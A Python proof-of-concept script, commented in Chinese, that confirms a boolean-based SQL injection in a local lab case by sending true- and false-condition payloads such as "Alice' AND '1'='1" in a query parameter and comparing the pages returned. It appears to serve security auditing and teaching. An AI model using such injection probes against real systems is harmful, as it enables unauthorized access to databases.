#!/usr/bin/env python3
# S001 SQL注入本地验证脚本；仅访问 127.0.0.1:4280，不修改数据。
import urllib.parse
import urllib.request
import sys

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"


def fetch(name):
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    req = urllib.request.Request(url, headers={"User-Agent": "S001-audit-poc"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body


def show(label, name):
    status, body = fetch(name)
    compact = " ".join(body.split())
    print(f"[{label}] name={name!r} HTTP={status}")
    print("正文片段:", compact[:500])
    return body


try:
    normal_body = show("普通输入", "Alice")
    true_body = show("不修改数据的真条件测试", "Alice' AND '1'='1")
    false_body = show("不修改数据的假条件测试", "Alice' AND '1'='2")
except Exception as exc:
    print("请求失败:", repr(exc))
    print("请检查 127.0.0.1:4280 服务、common/db_connect.php 的 $db 连接、lab_people 表及预置数据。")
    sys.exit(2)

print("\n观察判定（基于正文内容，不以 HTTP 200 作为成功条件）：")
print("普通输入含 Alice:", "Alice" in normal_body)
print("真条件测试含 Alice:", "Alice" in true_body)
print("假条件测试不含 Alice:", "Alice" not in false_body)
print("预期观察: True / True / True")
print("若假条件测试仍含 Alice，请检查输入是否被改写、SQL 转义/绑定是否已加入或服务端缓存等因素。")
